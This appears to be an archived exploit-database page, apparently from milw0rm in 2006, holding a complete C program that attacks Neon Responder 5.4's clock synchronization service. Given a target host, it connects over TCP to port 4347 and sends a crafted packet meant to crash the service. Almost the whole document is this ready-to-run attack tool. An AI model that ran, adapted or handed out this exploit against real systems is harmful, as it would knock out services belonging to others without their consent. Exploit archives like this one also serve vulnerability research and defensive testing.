<html><head><title>Neon Responder 5.4 (Clock Synchronization) Denial of Service Exploit</title></head><pre>/* Stefan Lochbihler*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;winsock2.h&gt;

#pragma comment(lib,&quot;ws2_32&quot;)

#define PORT 4347
char CLOCK_MSG [] = &quot;\x00\x0e\x5a\x00\x4c\xe9\x24\xb1\x17\x88\x40\x84&quot;;   //Password = &quot;&quot;

void usage (char*);
void endpgr (char *,SOCKET, char*);
unsigned long gethost (char *);


int main(int argc, char *argv[])
{

   WSADATA wsa;
   SOCKET client;
   sockaddr_in peer;
   WORD wsVersion;

   char sendbuffer[16]=&quot;&quot;;
   char recvbuffer[16]=&quot;&quot;;
   unsigned long host=0;
   int err=0;

   if(argc&lt;2)
     usage(argv[0]);

   printf(&quot;\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n&quot;);


   if(WSAStartup(wsVersion=MAKEWORD(2,2),&amp;wsa)!=0)
   {
       printf(&quot;WSAStartup() fail\n&quot;);
       exit(0);
   }

   printf(&quot;%s:[+] Try to create socket\n&quot;,argv[0]);
   client=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
   if(client==INVALID_SOCKET)
      endpgr(argv[0],client,&quot;[-] socket() fail&quot;);

   printf(&quot;%s:[+] Lookup host\n&quot;,argv[0]);
   if(!(host=gethost(argv[1])))
      endpgr(argv[0],client,&quot;[-] host not found !&quot;);

   peer.sin_family = AF_INET;
   peer.sin_port = htons(PORT);
   peer.sin_addr.s_addr = host;

   printf(&quot;%s:[+] Connect to %s\n&quot;,argv[0],argv[1]);
   err=connect(client,(SOCKADDR*)&amp;peer,sizeof(struct sockaddr_in));
   if(err)
     endpgr(argv[0],client,&quot;[-] connect() fail&quot;);

   memcpy(sendbuffer,CLOCK_MSG,sizeof(CLOCK_MSG));

   printf(&quot;%s:[+] Try to send packet\n&quot;,argv[0]);
   err=send(client,sendbuffer,sizeof(sendbuffer),0);
   err=recv(client,recvbuffer,sizeof(recvbuffer)-1,0);

   endpgr(argv[0],client,&quot;[+] End successfully&quot;);

   return 0;

}

void usage(char *pgrname)
{
printf(&quot;\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n&quot;);
printf(&quot;%s: &lt;Targethost&gt;\n&quot;,pgrname);
exit(0);
}

void endpgr (char *pgrname, SOCKET client,char *msg)
{
   printf(&quot;%s:%s\n&quot;,pgrname,msg);
   WSACleanup();
   closesocket(client);
   exit(0);
}

unsigned long gethost(char *targethost)
{
unsigned long host=0;
hostent *phost=NULL;


host=inet_addr(targethost);
if(host==INADDR_NONE)
{
   if((phost=gethostbyname(targethost))==NULL)
      return 0;
   host=*(unsigned long*)phost-&gt;h_addr;
}

return host;
}

// milw0rm.com [2006-04-17]</pre></html>